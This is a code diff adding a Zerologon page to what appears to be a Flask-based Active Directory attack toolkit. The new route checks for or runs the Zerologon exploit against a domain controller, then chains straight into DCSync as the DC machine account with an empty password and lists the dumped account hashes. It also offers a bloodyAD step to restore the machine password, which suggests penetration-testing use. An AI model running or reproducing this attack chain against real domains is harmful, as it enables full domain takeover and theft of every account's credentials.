@@ -38,6 +38,11 @@ from ..utils.kerberoast import (
     check_kerberoast,
     run_kerberoast,
 )
+from ..utils.zerologon import (
+    check_zerologon,
+    run_zerologon,
+    restore_machine_account_password_bloodyad,
+)
 
 REQUIRED_CRED_KEYS = ("username", "password", "domain", "dc_ip")
 
@@ -277,7 +282,7 @@ def _missing_creds(creds):
     return [key for key in REQUIRED_CRED_KEYS if not creds.get(key)]
 
 
-def _render_exploit(template, creds, results, error, status_message, action):
+def _render_exploit(template, creds, results, error, status_message, action, **extra):
     return render_template(
         template,
         creds=creds,
@@ -285,6 +290,7 @@ def _render_exploit(template, creds, results, error, status_message, action):
         error=error,
         status_message=status_message,
         action=action,
+        **extra,
     )
 
 
@@ -567,6 +573,103 @@ def dcsync():
         error,
         status_message,
         action,
+    )
+
+
+@main_bp.route("/zerologon", methods=["GET", "POST"])
+def zerologon():
+    creds = _get_creds()
+    profiles = fetch_profiles()
+    active_profile = get_active_profile()
+    results = []
+    error = None
+    status_message = None
+    action = None
+    selected_restore_profile = None
+    restore_use_profile = False
+
+    dc_host = (creds.get("dc_fqdn") or "").strip()
+    dc_name = dc_host.split(".", 1)[0] if dc_host else ""
+
+    def format_dcsync_results(dcsync_results):
+        lines = []
+        for entry in dcsync_results:
+            if isinstance(entry, dict):
+                username = entry.get("username", "Unknown")
+                hash_value = entry.get("hash", "")
+                timestamp = entry.get("timestamp")
+                if timestamp:
+                    lines.append(f"{username}: {hash_value} ({timestamp})")
+                else:
+                    lines.append(f"{username}: {hash_value}")
+            else:
+                lines.append(str(entry))
+        return lines
+
+    if request.method == "POST":
+        action = request.form.get("action")
+        selected_restore_profile = (request.form.get("restore_profile") or "").strip()
+        use_profile = request.form.get("use_profile") == "1"
+        restore_use_profile = use_profile
+
+        if not dc_name or not creds.get("dc_ip"):
+            error = "Please provide DC FQDN and DC IP in the profile settings."
+        else:
+            if action == "restore":
+                machine_account = (request.form.get("machine_account") or "").strip()
+                new_password = (request.form.get("new_password") or "").strip()
+                if not machine_account or not new_password:
+                    error = "Please provide the machine account and new password."
+                else:
+                    restore_creds = creds
+                    if use_profile:
+                        if not selected_restore_profile:
+                            error = "Please select a profile for restore credentials."
+                        elif selected_restore_profile not in profiles:
+                            error = "Selected profile not found."
+                        else:
+                            restore_creds = profiles.get(selected_restore_profile, {})
+
+                    if not error:
+                        missing = _missing_creds(restore_creds)
+                        if missing:
+                            error = "Selected profile is missing required credentials."
+
+                if not error:
+                    results = restore_machine_account_password_bloodyad(
+                        restore_creds.get("domain"),
+                        restore_creds.get("username"),
+                        restore_creds.get("password"),
+                        restore_creds.get("dc_ip"),
+                        machine_account,
+                        new_password,
+                    )
+            elif action == "exploit":
+                results = run_zerologon(dc_name, creds["dc_ip"])
+                if results and any("Exploit complete" in line for line in results):
+                    status_message = "Zerologon exploit completed. Running DCSync with the DC machine account."
+                    dcsync_results = run_dcsync(
+                        creds.get("domain"),
+                        f"{dc_name}$",
+                        "",
+                        creds.get("dc_ip"),
+                        no_pass=True,
+                    )
+                    results = results + ["", "DCSync output:"] + format_dcsync_results(dcsync_results)
+            else:
+                results = check_zerologon(dc_name, creds["dc_ip"])
+
+    return _render_exploit(
+        "zerologon.html",
+        creds,
+        results,
+        error,
+        status_message,
+        action,
+        profiles=profiles,
+        active_profile=active_profile,
+        selected_restore_profile=selected_restore_profile,
+        restore_use_profile=restore_use_profile,
     )
 
 # Others
